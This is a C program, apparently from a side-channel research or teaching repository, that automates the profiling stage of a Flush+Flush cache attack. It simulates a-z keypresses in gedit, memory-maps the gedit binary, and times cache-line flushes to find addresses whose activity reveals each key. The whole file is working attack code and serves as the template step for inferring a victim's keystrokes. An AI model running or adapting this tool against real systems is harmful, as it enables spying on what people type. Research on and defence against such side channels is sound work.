#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <stdio.h>
#include <xdo.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <sched.h>
#include <sys/mman.h>
#include <stdint.h>
#include "../../cacheutils.h"
// Automated verison of the Flush&Flush cache attack profiling stage.

// Adjust this number for your machine. it is the threshold between hit and miss.
#define MIN_HIT (105)

// Init xdo - a library that simulates keypresses
xdo_t* xdo;
size_t nkeys = 0;
char key[2] = {'0', 0};
Window win;

// Execute Flush&Flush and count the number of cache hits during the profiling stage.
size_t flushandflush(void* addr, size_t duration)
{
  size_t count = 0;
  size_t time = 0;
  size_t delta = 0;
  size_t end = rdtsc() + duration * 1000*1000;
  while(time < end)
  {
    time = rdtsc();
    flush(addr);
    delta = rdtsc() - time;
    if (delta > MIN_HIT)
    {
      count++;
    }
    for (int i = 0; i < 25; ++i)
      sched_yield();
  }
  return count;
}

// Execute keypresses for a-z keys. for each stage, simulate the keypress of the key presented in key field. for each iteration, 
// create a keypress and delete previous text on gedit (Ctrl+a and Delete)
void keythread()
{
  int count = 0;
  char lkey = 'a';
  while (1)
  {
    if (*key != lkey)
    {
      lkey = *key;
      xdo_send_keysequence_window(xdo, CURRENTWINDOW, "ctrl+a", 0);
      xdo_send_keysequence_window(xdo, CURRENTWINDOW, "Delete", 0);
      usleep(1500);
      count = 0;
      nkeys = 0;
    }
    count++;
    nkeys++;
    xdo_send_keysequence_window(xdo, CURRENTWINDOW, key, 0);
    usleep(1000);
    for (int i = 0; i < 25; ++i)
      sched_yield();
  }
}

// Notice that xdo simulates keypresses on the current open window. so its importent to change to gedit before the xdo
// thread start (By executing sleep before running spy).
int main(int argc, char** argv)
{

  // Init xdo threads
  XInitThreads();
  pthread_t t;

  // Init key object with keyid and the char that represents the key
  key[1] = 0;
  key[0] = 'a';

  xdo = xdo_new(NULL);
  xdo_get_active_window(xdo,&win);
  if (argc != 8)
    exit(!fprintf(stderr,"  usage: ./spy <probeduration> <addressrange> <perms> <offset> <dev> <inode> <filename>\n"
                 "example: ./spy 200             400000-489000  --    0        -- -- /usr/bin/gedit\n"));
  size_t duration = 0;

  if (!sscanf(argv[1],"%lu",&duration))
    exit(!printf("duration error\n"));
  
  // Input validity checks
  unsigned char* start = 0;
  unsigned char* end = 0;
  if (!sscanf(argv[2],"%p-%p",&start,&end))
    exit(!printf("address range error\n"));
  
  size_t range = end - start;
  size_t offset = 0;

  if (!sscanf(argv[4],"%lx",&offset))
    exit(!printf("offset error\n"));
  
  char filename[4096];
  if (!sscanf(argv[7],"%s",filename))
    exit(!fprintf(stderr,"filename error\n"));

  // Starting profiling...
  fprintf(stderr,"filename: %80s, offset: %8lx, duration: %luus, probes: %10lu\n",filename,offset,duration,range/64);
  if (duration == 0)
    exit(0);
  pthread_create(&t,0,(void*(*)(void*))keythread,0);

  // Open attaked process
  int fd = open(filename,O_RDONLY);

  // Map process to the program's virtual memory
  start = ((unsigned char*)mmap(0, range, PROT_READ, MAP_SHARED, fd, offset & ~0xFFFUL)) + (offset & 0xFFFUL);
  char j = 0;

  // Range of letters we want to profile
  char* chars = "abcdefghijklmnopqrstuvwxyz";
  size_t chars_len = strlen(chars);
  float* result = malloc(sizeof(float) * chars_len * range/64);
  size_t count = 0;
  size_t promille = 0;
  
  // Profiling loop, mesure time while simulating keypresses  
 	for (size_t i = 0; i < range; i += 64)
  {
    for (j = 0; j < chars_len; ++j)
    {
      key[0] = chars[j];

      //Prioritize other processes on OS
      for (size_t k = 0; k < 5; ++k)
        sched_yield();
      nkeys = 0;
      flush(start + i);
      for (size_t k = 0; k < 5; ++k)
        sched_yield();
      count = flushandflush(start + i, duration);
      result[i/64 * chars_len + j] = 1.0 * count / nkeys;
    }
    if (1000 * i / range > promille)
    {
      promille = 1000 * i / range;
      fprintf(stderr,"%ld/1000\n",promille);
    }
  }
  

  int should_print_Addr(size_t i){
     int count = 0;
     float lp = 50.0; //Starting Upper bound
     for (float p = 1.0; p > 0.7; p -= 0.1)
     {
      //For Each monitored key
      for (size_t j = 0; j < chars_len; ++j)
        if (result[i * chars_len + j] >= p && result[i * chars_len + j] < lp)
        {
          count++;
        }
      lp = p;
    }
    return ((count > 0) && (count < 6));
  }

  // Print Memory address and key binding. notice that we want the threshold to be more than 70% hits for key, per memory address.
  // We don't want to monitor addresses for void, so we filter memory addresses with more than 5 keys associated with it, and with less than 1.
  fprintf(stderr,"Events per address:\n");
  size_t found = 0;
  // For Each memory address
  for (size_t i = 0; i < range/64; ++i)
  {
    if(should_print_Addr(i)){
        printf("%8p,",(void*)(offset + i * 64));
        fprintf(stderr,"%8p:",(void*)(offset + i * 64));
        float lp = 50.0; //Starting Upper bound
        for (float p = 1.0; p > 0.7; p -= 0.1)
        {
          //For Each monitored key
          for (size_t j = 0; j < chars_len; ++j)
            if (result[i * chars_len + j] >= p && result[i * chars_len + j] < lp)
            {
              fprintf(stderr,"%c",chars[j]);
              printf("%c",chars[j]);
            }
          lp = p;
        }
        fprintf(stderr,"\n");
        printf("\n");
    } 
  }
  
  free(result);
  munmap(start,range);
  close(fd);
  return 0;
}

